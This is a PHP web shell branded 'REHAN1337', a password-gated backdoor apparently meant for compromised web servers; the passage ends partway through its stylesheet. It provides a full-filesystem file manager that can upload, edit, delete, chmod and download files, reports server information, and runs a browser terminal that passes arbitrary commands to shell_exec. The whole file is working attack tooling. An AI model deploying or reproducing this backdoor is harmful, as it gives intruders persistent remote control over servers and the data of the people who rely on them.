<?php
session_start();

// ============ CONFIG ============
$PASSWORD_MD5 = "694bd02329e0ce0ed67794246b18b49d";
$ROOT         = '/';
$START        = getcwd();
$LOGO         = "https://new.avestahost.com/rehanx.jpg";
$APP_NAME     = "REHAN1337";
// ================================

if (isset($_POST['pass'])) {
    if (md5($_POST['pass']) === $PASSWORD_MD5) {
        $_SESSION['login'] = true;
        header("Location: ?"); exit;
    } else { $err = "Password salah!"; }
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

// ---- Icons ----
function icon($name, $size = 18) {
    $icons = [
        'folder'   => '<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/>',
        'file'     => '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/><path d="M14 2v6h6"/>',
        'upload'   => '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/>',
        'download' => '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/>',
        'rename'   => '<path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/>',
        'edit-pencil' => '<path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/>',
        'chmod'    => '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
        'trash'    => '<polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/>',
        'home'     => '<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>',
        'logout'   => '<path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5"/><path d="M21 12H9"/>',
        'plus'     => '<path d="M12 5v14"/><path d="M5 12h14"/>',
        'back'     => '<path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/>',
        'save'     => '<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><path d="M17 21v-8H7v8"/><path d="M7 3v5h8"/>',
        'lock'     => '<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
        'arrow'    => '<path d="M5 12h14"/><path d="M12 5l7 7-7 7"/>',
        'check'    => '<polyline points="20 6 9 17 4 12"/>',
        'x'        => '<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>',
        'alert'    => '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>',
        'terminal' => '<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
        'play'     => '<polygon points="5 3 19 12 5 21 5 3"/>',
        'clear'    => '<path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>',
    ];
    $p = $icons[$name] ?? '';
    return "<svg width='$size' height='$size' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' style='vertical-align:middle;flex-shrink:0'>$p</svg>";
}

// ---- Delete recursive ----
function deletePath($target) {
    if (!file_exists($target) && !is_link($target)) {
        return ['ok' => false, 'msg' => 'Tidak ditemukan'];
    }
    if (is_file($target) || is_link($target)) {
        return @unlink($target)
            ? ['ok' => true, 'msg' => 'File berhasil dihapus']
            : ['ok' => false, 'msg' => 'Gagal hapus file (permission?)'];
    }
    if (is_dir($target)) {
        $items = @scandir($target);
        if ($items === false) return ['ok' => false, 'msg' => 'Tidak bisa baca folder'];
        $allOk = true; $errors = 0;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $r = deletePath(rtrim($target,'/') . '/' . $it);
            if (!$r['ok']) { $allOk = false; $errors++; }
        }
        if (!$allOk) return ['ok' => false, 'msg' => "Sebagian isi gagal dihapus ($errors item)"];
        return @rmdir($target)
            ? ['ok' => true, 'msg' => 'Folder + semua isi berhasil dihapus']
            : ['ok' => false, 'msg' => 'Gagal hapus folder (permission?)'];
    }
    return ['ok' => false, 'msg' => 'Tipe tidak dikenali'];
}

// ---- Server Info ----
$hostname = @php_uname('n') ?: 'server';
$uname    = @php_uname('s') . ' ' . @php_uname('r');
$user     = function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_geteuid())['name'] ?? 'unknown') : 'unknown';
$total    = @disk_total_space('/');
$free     = @disk_free_space('/');
$hddPct   = ($total && $total > 0) ? round((($total - $free) / $total) * 100) : 0;
$hddTxt   = ($total && $total > 0) ? round($free/1073741824,1) . ' GB free / ' . round($total/1073741824,1) . ' GB' : 'N/A';

// ---- NOTIFICATION SYSTEM ----
$notify = null;
if (!empty($_SESSION['flash'])) {
    $notify = $_SESSION['flash'];
    unset($_SESSION['flash']);
}

// ---- LOGIN ----
if (empty($_SESSION['login'])) {
    ?>
    <!DOCTYPE html><html><head><meta charset="utf-8"><title><?=htmlspecialchars($APP_NAME)?> - Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#040814;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
        body::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 20% 30%,rgba(30,58,138,.4),transparent 50%),radial-gradient(circle at 80% 70%,rgba(37,99,235,.3),transparent 50%);animation:pulse 8s ease-in-out infinite}
        @keyframes pulse{0%,100%{opacity:.6}50%{opacity:1}}
        .login-box{position:relative;background:rgba(10,20,40,.8);backdrop-filter:blur(20px);border:1px solid rgba(59,130,246,.4);border-radius:22px;padding:50px 42px 40px;width:400px;box-shadow:0 0 50px rgba(30,58,138,.6),0 0 90px rgba(37,99,235,.3);animation:fadeIn .6s ease}
        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
        .logo-wrap{width:150px;height:150px;margin:0 auto 28px;border-radius:50%;padding:4px;background:linear-gradient(135deg,#1e3a8a,#2563eb,#60a5fa,#1e3a8a);background-size:200% 200%;box-shadow:0 0 35px rgba(37,99,235,.8),0 0 70px rgba(96,165,250,.4);animation:glow 3s ease-in-out infinite,spinBorder 6s linear infinite}
        @keyframes glow{0%,100%{box-shadow:0 0 35px rgba(37,99,235,.8),0 0 70px rgba(96,165,250,.4)}50%{box-shadow:0 0 50px rgba(96,165,250,1),0 0 90px rgba(37,99,235,.6)}}
        @keyframes spinBorder{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
        .logo-wrap img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block}
        h2{color:#fff;text-align:center;font-size:28px;font-weight:800;margin-bottom:6px;letter-spacing:1px;background:linear-gradient(135deg,#60a5fa,#3b82f6,#1e3a8a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 30px rgba(96,165,250,.5)}
        .subtitle{color:#94a3b8;text-align:center;font-size:13px;margin-bottom:32px;opacity:.85;letter-spacing:.5px}
        .input-group{position:relative;margin-bottom:20px}
        .input-group svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#60a5fa;pointer-events:none}
        input[type=password]{width:100%;padding:14px 14px 14px 45px;background:rgba(4,8,20,.9);border:1.5px solid rgba(59,130,246,.3);border-radius:12px;color:#fff;font-size:14px;outline:none;transition:all .3s;font-family:inherit}
        input[type=password]:focus{border-color:#60a5fa;box-shadow:0 0 0 3px rgba(59,130,246,.2),0 0 20px rgba(59,130,246,.4)}
        input::placeholder{color:#64748b}
        button{width:100%;padding:14px;background:linear-gradient(135deg,#1e3a8a,#2563eb,#3b82f6);border:0;border-radius:12px;color:#fff;font-weight:700;font-size:14px;letter-spacing:1px;cursor:pointer;transition:all .3s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 0 20px rgba(37,99,235,.5)}
        button:hover{transform:translateY(-2px);box-shadow:0 0 35px rgba(37,99,235,1)}
        .err{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.4);color:#fca5a5;padding:10px;border-radius:10px;text-align:center;font-size:13px;margin-bottom:20px}
        .footer{text-align:center;color:#475569;font-size:11px;margin-top:28px;letter-spacing:1.5px;text-transform:uppercase;font-weight:600}
        .footer span{color:#60a5fa;text-shadow:0 0 10px rgba(96,165,250,.6)}
        @media(max-width:480px){.login-box{width:92%;padding:40px 25px 30px}.logo-wrap{width:120px;height:120px}h2{font-size:24px}}
    </style></head><body>
    <form class="login-box" method="post">
        <div class="logo-wrap"><img src="<?=htmlspecialchars($LOGO)?>" alt="Logo"></div>
        <h2><?=htmlspecialchars($APP_NAME)?></h2>
        <div class="subtitle"></div>
        <?php if(!empty($err)) echo "<div class='err'>".htmlspecialchars($err)."</div>"; ?>
        <div class="input-group"><?=icon('lock',18)?><input type="password" name="pass" placeholder="Password" autofocus required></div>
        <button type="submit"><?=icon('arrow',16)?> LOGIN</button>
        <div class="footer">Powered by <span><?=htmlspecialchars($APP_NAME)?></span></div>
    </form>
    </body></html>
    <?php exit;
}

// ===== PATH HANDLER =====
if (isset($_GET['p']) && $_GET['p'] !== '') {
    $raw = $_GET['p'];
    $candidate = ($raw[0] === '/') ? $raw : $START . '/' . $raw;
    $path = @realpath($candidate);
    if ($path === false || !is_dir($path)) $path = realpath($START) ?: '/';
} else {
    $path = realpath($START) ?: '/';
}
$path = rtrim($path, '/');
if ($path === '') $path = '/';

function flash($type, $msg, $redirect = null) {
    $_SESSION['flash'] = ['type' => $type, 'msg' => $msg];
    $url = $redirect ?: ($_SERVER['REQUEST_URI'] ?? '?');
    $clean = preg_replace('/([?&])(del|dl|edit)=[^&]*/', '$1', $url);
    $clean = preg_replace('/[?&]+$/', '', $clean);
    $clean = preg_replace('/[?&]+&/', '?', $clean);
    header("Location: " . $clean);
    exit;
}

// ---- Actions ----
if (!empty($_FILES['file']['name'])) {
    $t = $path . '/' . basename($_FILES['file']['name']);
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $t)) {
        flash('success', 'File berhasil diupload: ' . basename($_FILES['file']['name']));
    } else {
        flash('error', 'Upload gagal! Cek permission folder.');
    }
}
if (!empty($_POST['newfile'])) {
    $f = $path . '/' . basename($_POST['newfile']);
    if (!file_exists($f) && @file_put_contents($f,'')!==false) {
        flash('success', 'File berhasil dibuat: ' . $_POST['newfile']);
    } else {
        flash('error', 'Gagal buat file!');
    }
}
if (!empty($_POST['newfolder'])) {
    $d = $path . '/' . basename($_POST['newfolder']);
    if (@mkdir($d)) {
        flash('success', 'Folder berhasil dibuat: ' . $_POST['newfolder']);
    } else {
        flash('error', 'Gagal buat folder!');
    }
}
if (isset($_POST['content']) && !empty($_POST['editfile'])) {
    $f = $path . '/' . $_POST['editfile'];
    if (@file_put_contents($f, $_POST['content'])!==false) {
        flash('success', 'File berhasil disimpan: ' . $_POST['editfile'], '?p=' . urlencode($path));
    } else {
        flash('error', 'Gagal simpan file!', '?p=' . urlencode($path));
    }
}

// ==== DELETE ====
if (!empty($_GET['del'])) {
    $name = basename($_GET['del']);
    $t = $path . '/' . $_GET['del'];
    $r = deletePath($t);
    if ($r['ok']) {
        flash('success', $r['msg'] . ': ' . $name);
    } else {
        flash('error', $r['msg'] . ': ' . $name);
    }
}

if (!empty($_POST['rename_from']) && !empty($_POST['rename_to'])) {
    if (@rename($path.'/'.$_POST['rename_from'], $path.'/'.$_POST['rename_to'])) {
        flash('success', 'Berhasil rename: ' . $_POST['rename_from'] . ' → ' . $_POST['rename_to']);
    } else {
        flash('error', 'Gagal rename!');
    }
}
if (!empty($_POST['chmod_file']) && !empty($_POST['chmod_mode'])) {
    if (@chmod($path.'/'.$_POST['chmod_file'], octdec($_POST['chmod_mode']))) {
        flash('success', 'Chmod berhasil: ' . $_POST['chmod_file'] . ' → ' . $_POST['chmod_mode']);
    } else {
        flash('error', 'Gagal chmod!');
    }
}
if (!empty($_GET['dl'])) {
    $f = $path . '/' . $_GET['dl'];
    if (is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        readfile($f); exit;
    }
}

// =============================================
// === TERMINAL AJAX HANDLER ===
// =============================================
if (!empty($_POST['terminal_cmd'])) {
    header('Content-Type: application/json');
    $cmd = trim($_POST['terminal_cmd']);
    $cwd = $_POST['cwd'] ?? $START;
    if (!is_dir($cwd)) $cwd = $START;

    $output = '';
    $newCwd = $cwd;

    // Built-in commands (tanpa shell_exec, lebih aman)
    $parts = preg_split('/\s+/', $cmd, 2);
    $base  = strtolower($parts[0] ?? '');
    $args  = $parts[1] ?? '';

    try {
        switch ($base) {
            case '':
                break;
            case 'pwd':
                $output = $cwd . "\n";
                break;
            case 'whoami':
                $output = (function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_geteuid())['name'] ?? 'unknown') : 'unknown') . "\n";
                break;
            case 'id':
                $output = @shell_exec('id 2>&1');
                break;
            case 'uname':
                $output = @php_uname('a') . "\n";
                break;
            case 'hostname':
                $output = @php_uname('n') . "\n";
                break;
            case 'date':
                $output = date('D M j H:i:s T Y') . "\n";
                break;
            case 'echo':
                $output = $args . "\n";
                break;
            case 'ls':
                $list = @scandir($cwd);
                if ($list === false) { $output = "ls: cannot access '" . $cwd . "': Permission denied\n"; break; }
                $list = array_filter($list, fn($x) => $x !== '.' && $x !== '..');
                sort($list);
                if ($args === '-la' || $args === '-l') {
                    foreach ($list as $it) {
                        $full = $cwd . '/' . $it;
                        $perms = substr(sprintf('%o', @fileperms($full)), -4);
                        $size = is_dir($full) ? '     -' : sprintf('%6s', round(@filesize($full)/1024,1).'K');
                        $mtime = date('M d H:i', @filemtime($full));
                        $type = is_dir($full) ? 'd' : '-';
                        $output .= $type . $perms . '  ' . $size . '  ' . $mtime . '  ' . $it . (is_dir($full)?'/':'') . "\n";
                    }
                } else {
                    $output = implode('  ', $list) . "\n";
                }
                break;
            case 'cd':
                if ($args === '' || $args === '~') {
                    $newCwd = $START;
                } elseif ($args === '-') {
                    $newCwd = $_POST['prev_cwd'] ?? $START;
                } elseif (substr($args, 0, 1) === '/') {
                    $newCwd = $args;
                } else {
                    $newCwd = rtrim($cwd, '/') . '/' . $args;
                }
                $newCwd = @realpath($newCwd);
                if ($newCwd === false || !is_dir($newCwd)) {
                    $output = "cd: no such file or directory: " . $args . "\n";
                    $newCwd = $cwd;
                }
                break;
            case 'cat':
                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
                if (is_file($target) && is_readable($target)) {
                    $output = @file_get_contents($target);
                    if ($output === false) $output = "cat: read error\n";
                } else {
                    $output = "cat: " . $args . ": No such file or permission denied\n";
                }
                break;
            case 'head':
                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
                if (is_file($target)) {
                    $lines = @file($target, FILE_IGNORE_NEW_LINES);
                    $output = implode("\n", array_slice($lines, 0, 10)) . "\n";
                } else {
                    $output = "head: " . $args . ": No such file\n";
                }
                break;
            case 'tail':
                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
                if (is_file($target)) {
                    $lines = @file($target, FILE_IGNORE_NEW_LINES);
                    $output = implode("\n", array_slice($lines, -10)) . "\n";
                } else {
                    $output = "tail: " . $args . ": No such file\n";
                }
                break;
            case 'mkdir':
                if ($args === '') { $output = "mkdir: missing operand\n"; break; }
                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
                $output = @mkdir($target) ? '' : "mkdir: cannot create directory: $args\n";
                break;
            case 'rm':
                if ($args === '') { $output = "rm: missing operand\n"; break; }
                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
                $r = deletePath($target);
                $output = $r['ok'] ? '' : "rm: " . $r['msg'] . "\n";
                break;
            case 'touch':
                if ($args === '') { $output = "touch: missing operand\n"; break; }
                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
                $output = @touch($target) ? '' : "touch: cannot touch: $args\n";
                break;
            case 'df':
                $output = "Filesystem      Size  Used Avail Use% Mounted on\n";
                $t = @disk_total_space('/');
                $f = @disk_free_space('/');
                if ($t && $f) {
                    $used = $t - $f;
                    $pct  = round(($used / $t) * 100);
                    $output .= sprintf("%-14s %5.1fG %5.1fG %5.1fG %3d%% /\n", '/dev/root', $t/1073741824, $used/1073741824, $f/1073741824, $pct);
                } else {
                    $output .= "df: cannot read filesystem info\n";
                }
                break;
            case 'free':
                $output = "              total        used        free\n";
                $t = @disk_total_space('/');
                $f = @disk_free_space('/');
                if ($t && $f) {
                    $output .= sprintf("Mem/Disk: %10.1fG %10.1fG %10.1fG\n", $t/1073741824, ($t-$f)/1073741824, $f/1073741824);
                } else {
                    $output .= "free: cannot read memory info\n";
                }
                break;
            case 'ps':
                $output = @shell_exec('ps aux 2>&1 | head -20');
                break;
            case 'uptime':
                $output = @shell_exec('uptime 2>&1');
                break;
            case 'clear':
                $output = '__CLEAR__';
                break;
            case 'help':
                $output = "Available commands (built-in):\n";
                $output .= "  ls [-l|-la]   List files\n";
                $output .= "  cd <dir>      Change directory\n";
                $output .= "  pwd           Print working directory\n";
                $output .= "  cat <file>    Show file contents\n";
                $output .= "  head <file>   First 10 lines\n";
                $output .= "  tail <file>   Last 10 lines\n";
                $output .= "  mkdir <dir>   Create folder\n";
                $output .= "  touch <file>  Create empty file\n";
                $output .= "  rm <path>     Delete file/folder\n";
                $output .= "  echo <text>   Print text\n";
                $output .= "  whoami/id     User info\n";
                $output .= "  uname/hostname/date\n";
                $output .= "  df/free/ps/uptime\n";
                $output .= "  clear         Clear terminal\n";
                $output .= "  help          Show this help\n";
                $output .= "\nAll other commands executed via system shell.\n";
                break;
            default:
                // Fallback: shell_exec untuk perintah lain (jika tersedia)
                if (function_exists('shell_exec')) {
                    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
                    $output = @shell_exec($fullCmd);
                    if ($output === null) {
                        $output = "Command not found: " . $base . "\n";
                    }
                } else {
                    $output = "shell_exec disabled. Command not available: " . $base . "\n";
                }
        }
    } catch (Throwable $e) {
        $output = "Error: " . $e->getMessage() . "\n";
    }

    echo json_encode([
        'output' => $output,
        'cwd'    => $newCwd,
    ]);
    exit;
}

// ---- Editor ----
if (!empty($_GET['edit'])) {
    $f = $path . '/' . $_GET['edit'];
    if (is_file($f)) {
        $content = htmlspecialchars(file_get_contents($f));
        $fname = htmlspecialchars($_GET['edit']);
        $back = '?p='.urlencode($path);
        ?>
        <!DOCTYPE html><html><head><meta charset="utf-8"><title><?=htmlspecialchars($APP_NAME)?> - Edit: <?=$fname?></title>
        <style>
            *{box-sizing:border-box;margin:0;padding:0}
            body{background:#040814;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column}
            .bar{background:rgba(10,20,40,.9);backdrop-filter:blur(15px);border-bottom:1px solid rgba(59,130,246,.3);padding:14px 20px;display:flex;align-items:center;gap:15px}
            .bar a{color:#60a5fa;text-decoration:none;display:flex;align-items:center;gap:6px;font-size:14px}
            .bar a:hover{color:#93c5fd}
            .fname{color:#fff;font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis}
            .save-btn{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;border:0;padding:8px 20px;border-radius:8px;cursor:pointer;font-weight:700;font-size:13px;display:flex;align-items:center;gap:6px;box-shadow:0 0 15px rgba(37,99,235,.6)}
            .save-btn:hover{box-shadow:0 0 25px rgba(37,99,235,.9)}
            textarea{flex:1;width:100%;background:#040814;color:#e2e8f0;border:0;padding:20px;font-family:'JetBrains Mono','Courier New',monospace;font-size:14px;line-height:1.6;resize:none;outline:none;tab-size:4}
        </style></head><body>
        <div class="bar">
            <a href="<?=$back?>"><?=icon('back',16)?> Back</a>
            <div class="fname"><?=$fname?></div>
            <button type="submit" form="ef" class="save-btn"><?=icon('save',14)?> SAVE</button>
        </div>
        <form method="post" id="ef" style="flex:1;display:flex;flex-direction:column">
            <input type="hidden" name="editfile" value="<?=$fname?>">
            <textarea name="content" spellcheck="false"><?=$content?></textarea>
        </form>
        </body></html>
        <?php exit;
    }
}

// =============================================
// === URUTKAN: FOLDER DULU, BARU FILE ===
// =============================================
$rawItems = @scandir($path) ?: [];
$folders = [];
$files = [];
foreach ($rawItems as $it) {
    if ($it === '.' || $it === '..') continue;
    $full = $path.'/'.$it;
    if (is_dir($full)) {
        $folders[] = $it;
    } else {
        $files[] = $it;
    }
}
usort($folders, 'strcasecmp');
usort($files, 'strcasecmp');

// Build PWD parts
$absParts = [['label'=>'/','abs'=>'/']];
$cum = '';
foreach (array_filter(explode('/', $path), 'strlen') as $seg) {
    $cum .= '/'.$seg;
    $absParts[] = ['label'=>$seg, 'abs'=>$cum];
}
$absLast = count($absParts) - 1;
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title><?=htmlspecialchars($APP_NAME)?> - <?=htmlspecialchars($path)?></title>
<style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#040814;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:22px;position:relative}
    body::before{content:'';position:fixed;inset:0;z-index:-1;background:radial-gradient(circle at 10% 10%,rgba(30,58,138,.15),transparent 40%),radial-gradient(circle at 90% 90%,rgba(37,99,235,.15),transparent 40%)}

    /* ===== POPUP ===== */
    .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(3px);z-index:9998;opacity:0;animation:fadeOverlay .3s ease forwards}
    @keyframes fadeOverlay{to{opacity:1}}
    .popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(.8);z-index:9999;min-width:320px;max-width:90vw;background:rgba(10,20,40,.95);backdrop-filter:blur(20px);border-radius:18px;padding:32px 36px 28px;text-align:center;animation:popIn .4s cubic-bezier(.34,1.56,.64,1) forwards;box-shadow:0 20px 60px rgba(0,0,0,.6)}
    @keyframes popIn{0%{opacity:0;transform:translate(-50%,-50%) scale(.5)}100%{opacity:1;transform:translate(-50%,-50%) scale(1)}}
    .popup.hide{animation:popOut .3s ease forwards}
    @keyframes popOut{to{opacity:0;transform:translate(-50%,-50%) scale(.9)}}
    .popup.success{border:2px solid rgba(59,130,246,.6);box-shadow:0 0 40px rgba(59,130,246,.5),0 20px 60px rgba(0,0,0,.6)}
    .popup.error{border:2px solid rgba(239,68,68,.6);box-shadow:0 0 40px rgba(239,68,68,.5),0 20px 60px rgba(0,0,0,.6)}
    .popup-icon{width:70px;height:70px;margin:0 auto 16px;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:iconBounce .5s ease .1s backwards}
    @keyframes iconBounce{0%{transform:scale(0) rotate(-180deg);opacity:0}60%{transform:scale(1.15) rotate(10deg)}100%{transform:scale(1) rotate(0);opacity:1}}
    .popup.success .popup-icon{background:rgba(59,130,246,.15);border:2px solid rgba(59,130,246,.5);color:#60a5fa;box-shadow:0 0 25px rgba(59,130,246,.6)}
    .popup.error .popup-icon{background:rgba(239,68,68,.15);border:2px solid rgba(239,68,68,.5);color:#f87171;box-shadow:0 0 25px rgba(239,68,68,.6)}
    .popup-title{font-size:20px;font-weight:800;margin-bottom:10px;letter-spacing:.5px}
    .popup.success .popup-title{color:#60a5fa;text-shadow:0 0 15px rgba(96,165,250,.6)}
    .popup.error .popup-title{color:#f87171;text-shadow:0 0 15px rgba(248,113,113,.6)}
    .popup-msg{font-size:14px;color:#e2e8f0;line-height:1.5;word-break:break-word;margin-bottom:20px}
    .popup-msg b{color:#fff}
    .popup-btn{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;border:0;padding:10px 30px;border-radius:9px;font-weight:700;font-size:13px;letter-spacing:.8px;cursor:pointer;font-family:inherit;box-shadow:0 0 20px rgba(37,99,235,.5);transition:all .2s}
    .popup-btn:hover{transform:translateY(-2px);box-shadow:0 0 30px rgba(37,99,235,.9)}
    .popup.success .popup-btn{background:linear-gradient(135deg,#2563eb,#1d4ed8);box-shadow:0 0 20px rgba(37,99,235,.5)}
    .popup.success .popup-btn:hover{box-shadow:0 0 30px rgba(37,99,235,.9)}
    .popup.error .popup-btn{background:linear-gradient(135deg,#ef4444,#dc2626);box-shadow:0 0 20px rgba(239,68,68,.5)}
    .popup.error .popup-btn:hover{box-shadow:0 0 30px rgba(239,68,68,.9)}

    /* ===== INFO BAR ===== */
    .info-bar{display:flex;align-items:center;gap:18px;background:linear-gradient(145deg,rgba(10,20,40,.85),rgba(15,30,60,.85));backdrop-filter:blur(15px);border:1px solid rgba(59,130,246,.35);border-radius:16px;padding:16px 20px;margin-bottom:18px;box-shadow:0 0 30px rgba(37,99,235,.25),inset 0 0 20px rgba(59,130,246,.05);flex-wrap:wrap}
    .info-logo{width:80px;height:80px;border-radius:50%;padding:3px;flex-shrink:0;background:linear-gradient(135deg,#1e3a8a,#2563eb,#60a5fa);box-shadow:0 0 22px rgba(37,99,235,.9),0 0 45px rgba(96,165,250,.5);animation:logoGlow 3s ease-in-out infinite;overflow:hidden}
    @keyframes logoGlow{0%,100%{box-shadow:0 0 22px rgba(37,99,235,.9),0 0 45px rgba(96,165,250,.5)}50%{box-shadow:0 0 32px rgba(96,165,250,1),0 0 60px rgba(37,99,235,.8)}}
    .info-logo img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block}
    .info-content{flex:1;min-width:0;display:flex;flex-direction:column;gap:8px}
    .info-title-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
    .info-title{font-size:20px;font-weight:800;background:linear-gradient(135deg,#93c5fd,#60a5fa,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:1px}
    .live-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.4);color:#60a5fa;padding:2px 8px;border-radius:6px;font-size:10px;font-weight:700;letter-spacing:.5px}
    .live-badge::before{content:'';width:6px;height:6px;border-radius:50%;background:#60a5fa;box-shadow:0 0 6px #60a5fa;animation:blink 1.5s infinite}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
    .info-top-actions{margin-left:auto;display:flex;gap:8px;flex-shrink:0;flex-wrap:wrap}
    .info-top-actions a, .info-top-actions button{display:flex;align-items:center;gap:5px;padding:7px 13px;border-radius:8px;background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.35);color:#93c5fd;text-decoration:none;font-size:12px;font-weight:600;transition:all .2s;font-family:inherit;cursor:pointer}
    .info-top-actions a:hover, .info-top-actions button:hover{background:rgba(59,130,246,.3);border-color:#60a5fa;color:#fff;box-shadow:0 0 12px rgba(59,130,246,.5)}
    .info-top-actions a.logout{color:#fca5a5;border-color:rgba(239,68,68,.4);background:rgba(239,68,68,.1)}
    .info-top-actions a.logout:hover{background:rgba(239,68,68,.25);border-color:#ef4444;box-shadow:0 0 12px rgba(239,68,68,.5)}
    .info-top-actions button.terminal-btn{color:#4ade80;border-color:rgba(74,222,128,.4);background:rgba(74,222,128,.1)}
    .info-top-actions button.terminal-btn:hover{background:rgba(74,222,128,.25);border-color:#4ade80;box-shadow:0 0 12px rgba(74,222,128,.5);color:#fff}
    .info-chips{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
    .info-chips .chip{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:6px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.2);color:#93c5fd;font-family:'JetBrains Mono','Courier New',monospace;font-size:11px}
    .info-chips .chip b{color:#fff;font-weight:600}
    .info-chips .chip.pct{border-color:rgba(96,165,250,.4);background:rgba(96,165,250,.12);color:#bfdbfe}

    /* ===== PWD BAR ===== */
